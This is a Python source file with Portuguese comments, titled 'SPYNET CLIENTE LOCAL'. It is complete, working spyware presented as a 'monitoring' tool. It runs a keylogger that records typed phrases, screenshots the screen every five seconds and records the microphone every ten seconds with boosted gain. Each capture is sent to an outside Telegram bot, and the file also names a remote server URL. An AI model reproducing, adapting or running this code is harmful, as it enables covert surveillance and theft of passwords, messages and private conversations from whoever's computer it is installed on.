"""
SPYNET CLIENTE LOCAL - Monitoramento em Tempo Real

Configuração via arquivo .env (NÃO commitar no GitHub):
  BOT_TOKEN    = seu_token_telegram
  CHAT_ID      = seu_chat_id
  SERVIDOR_URL = https://sentinel-monitor.onrender.com

Instale python-dotenv:
  pip install python-dotenv
"""

import os
import threading
import time
import requests
import pyautogui
import sounddevice as sd
import soundfile as sf
from pynput import keyboard
from datetime import datetime
import numpy as np

# ============================================
# CARREGAR .env SE EXISTIR
# ============================================
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

# ============================================
# CONFIGURAÇÕES - via variáveis de ambiente
# ============================================
BOT_TOKEN    = os.environ.get('BOT_TOKEN', '')
CHAT_ID      = os.environ.get('CHAT_ID', '')
SERVIDOR_URL = os.environ.get('SERVIDOR_URL', '')

# Alertas de configuração ausente
if not BOT_TOKEN:
    print("⚠️  BOT_TOKEN não definido — notificações Telegram desativadas")
if not CHAT_ID:
    print("⚠️  CHAT_ID não definido — notificações Telegram desativadas")
if not SERVIDOR_URL:
    print("⚠️  SERVIDOR_URL não definido — sincronização com servidor desativada")

# Pastas locais
DATA_DIR       = "SystemData"
LOG_DIR        = os.path.join(DATA_DIR, "logs")
SCREENSHOT_DIR = os.path.join(DATA_DIR, "screenshots")
AUDIO_DIR      = os.path.join(DATA_DIR, "audio")
KEYLOG_PATH    = os.path.join(LOG_DIR, "syslog.txt")

for pasta in [DATA_DIR, LOG_DIR, SCREENSHOT_DIR, AUDIO_DIR]:
    os.makedirs(pasta, exist_ok=True)

# Estado
monitor_ativo    = True
tempo_screenshot = 5
tempo_audio      = 10
buffer_teclas    = ""
ultimo_tempo     = time.time()
ultimas_teclas   = []

# ============================================
# HELPERS
# ============================================

def _telegram_ok():
    return bool(BOT_TOKEN and CHAT_ID)

def enviar_telegram(texto, caminho=None):
    if not _telegram_ok():
        return
    try:
        if caminho and os.path.exists(caminho):
            with open(caminho, "rb") as f:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                requests.post(url,
                    data={"chat_id": CHAT_ID, "caption": texto},
                    files={"document": f},
                    timeout=10)
        else:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url,
                data={"chat_id": CHAT_ID, "text": texto},
                timeout=5)
    except:
        pass

# ============================================
# KEYLOGGER
# ============================================

def processar_tecla(tecla):
    global buffer_teclas, ultimas_teclas, monitor_ativo, ultimo_tempo
    if not monitor_ativo:
        return
    try:
        if hasattr(tecla, 'char') and tecla.char:
            c = tecla.char
            if c.isalnum() or c in [' ', '.', ',', '!', '?', '@', '#', '$', '-', '_']:
                buffer_teclas += c
                ultimo_tempo = time.time()
        else:
            nome = str(tecla).replace('Key.', '')
            if nome == 'space':
                buffer_teclas += ' '
                ultimo_tempo = time.time()
            elif nome == 'enter':
                if buffer_teclas.strip():
                    registrar_frase(buffer_teclas.strip())
                buffer_teclas = ""
            elif nome == 'backspace':
                buffer_teclas = buffer_teclas[:-1]

        if time.time() - ultimo_tempo > 2 and buffer_teclas.strip():
            registrar_frase(buffer_teclas.strip())
            buffer_teclas = ""
    except:
        pass

def registrar_frase(frase):
    global ultimas_teclas
    if not frase.strip():
        return
    registro = f"[{datetime.now().strftime('%H:%M:%S')}] {frase}"
    with open(KEYLOG_PATH, "a", encoding="utf-8") as f:
        f.write(registro + "\n")
    ultimas_teclas.append(registro)
    if len(ultimas_teclas) > 100:
        ultimas_teclas.pop(0)
    enviar_telegram(f"⌨️ {frase}")
    print(f"⌨️  {frase}")

def iniciar_keylogger():
    with keyboard.Listener(on_press=processar_tecla) as listener:
        listener.join()

# ============================================
# CAPTURAS
# ============================================

def capturar_screenshot():
    if not monitor_ativo:
        return None
    try:
        nome = f"scr_{int(time.time())}.png"
        caminho = os.path.join(SCREENSHOT_DIR, nome)
        pyautogui.screenshot(caminho)
        enviar_telegram("📸 Screenshot", caminho)
        print(f"📸 Screenshot: {nome}")
        return caminho
    except Exception as e:
        print(f"Erro screenshot: {e}")
        return None

def capturar_audio():
    if not monitor_ativo:
        return None
    try:
        nome = f"aud_{int(time.time())}.wav"
        caminho = os.path.join(AUDIO_DIR, nome)
        fs = 44100
        gravacao = sd.rec(int(5 * fs), samplerate=fs, channels=2, dtype='float32')
        sd.wait()
        gravacao = np.clip(gravacao * 5.0, -1.0, 1.0)
        sf.write(caminho, gravacao, fs)
        enviar_telegram("🎤 Áudio", caminho)
        print(f"🎤 Áudio: {nome}")
        return caminho
    except Exception as e:
        print(f"Erro áudio: {e}")
        return None

def loop_captura():
    while True:
        if monitor_ativo:
            capturar_screenshot()
        time.sleep(tempo_screenshot)

def loop_audio():
    while True:
        if monitor_ativo:
            capturar_audio()
        time.sleep(tempo_audio)

# ============================================
# MAIN
# ============================================

if __name__ == "__main__":
    print("=" * 60)
    print("🛡️  SPYNET CLIENTE LOCAL - MONITORAMENTO")
    print("=" * 60)
    print(f"📸 Screenshot : a cada {tempo_screenshot}s")
    print(f"🎤 Áudio      : a cada {tempo_audio}s")
    print(f"⌨️  Keylogger  : ativo")
    print(f"📡 Telegram   : {'✅ configurado' if _telegram_ok() else '❌ não configurado'}")
    print(f"🌐 Servidor   : {SERVIDOR_URL or 'não configurado'}")
    print("=" * 60)
    print("✅ Monitoramento INICIADO!")
    print("🛑 Pressione CTRL+C para parar")
    print("=" * 60)

    enviar_telegram("🛡️ SPYNET CLIENTE LOCAL INICIADO!")

    threading.Thread(target=iniciar_keylogger, daemon=True).start()
    threading.Thread(target=loop_captura, daemon=True).start()
    threading.Thread(target=loop_audio, daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n👋 Encerrando...")
